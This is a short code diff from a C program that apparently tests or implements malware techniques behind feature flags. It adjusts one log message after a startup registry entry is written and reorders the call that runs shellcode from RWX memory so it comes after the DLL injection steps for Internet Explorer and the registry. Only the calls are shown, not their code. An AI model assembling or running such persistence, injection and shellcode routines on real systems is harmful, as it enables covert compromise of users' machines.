@@ -77,7 +77,7 @@ void set_startup_registry(){
 	{
 		print_error("Could not set startup entry value."); 
 	}else{
-		print_error("Successfully set startup entry value."); 
+		print_status("Successfully set startup entry value."); 
 	}
 	RegCloseKey(hk); 
 	print_status("set_startup_registry ends");
@@ -217,10 +217,6 @@ int main(int argc,char **argv){
 	write_log();
 	#endif
 
-	#if SHELLCODE==1 && ALLOC_RWX_CALL==1
-	alloc_rwx_call();
-	#endif
-
 	#if DLL_INJECT_IE==1
 	dll_inject_ie();
 	#endif
@@ -231,6 +227,10 @@ int main(int argc,char **argv){
 
 	#if DLL_INJECT_REGISTRY==1
 	dll_inject_registry();
+	#endif
+
+	#if SHELLCODE==1 && ALLOC_RWX_CALL==1
+	alloc_rwx_call();
 	#endif
 
 	// clean up and exit
